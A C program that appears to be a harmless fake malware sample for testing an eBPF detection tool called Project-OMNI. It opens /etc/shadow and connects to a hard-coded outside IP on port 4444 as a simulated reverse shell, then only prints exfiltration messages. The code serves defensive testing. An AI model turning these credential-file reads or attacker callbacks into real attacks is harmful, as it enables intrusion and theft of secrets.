#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>

int main() {
    printf("[*] OMNI Fake Malware Sample Initializing...\n");
    sleep(1);

    // 1. Suspicious File Access
    printf("[*] Attempting to read protected secrets...\n");
    FILE *f = fopen("/etc/shadow", "r");
    if (f) {
        printf("[+] Successfully accessed /etc/shadow\n");
        fclose(f);
    } else {
        printf("[-] Failed to read /etc/shadow (expected on Android, but syscall logged)\n");
    }

    sleep(1);

    // 2. Suspicious Network Connection (Simulated Reverse Shell)
    printf("[*] Initiating outbound reverse shell connection to 185.123.45.67:4444...\n");
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return 1;
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    server.sin_addr.s_addr = inet_addr("185.123.45.67");

    // This syscall will trigger the eBPF hook
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        printf("[-] Connection refused (expected, but syscall logged)\n");
    } else {
        printf("[+] Connection established! Spawning shell...\n");
    }

    // If we survive the Ring-0 kill (we shouldn't!), we loop.
    printf("[!] WARNING: Survived Ring-0 kill! Project-OMNI mitigation failed.\n");
    for (int i = 0; i < 10; i++) {
        printf("[!] Exfiltrating data chunk %d...\n", i);
        sleep(2);
    }

    close(sock);
    return 0;
}
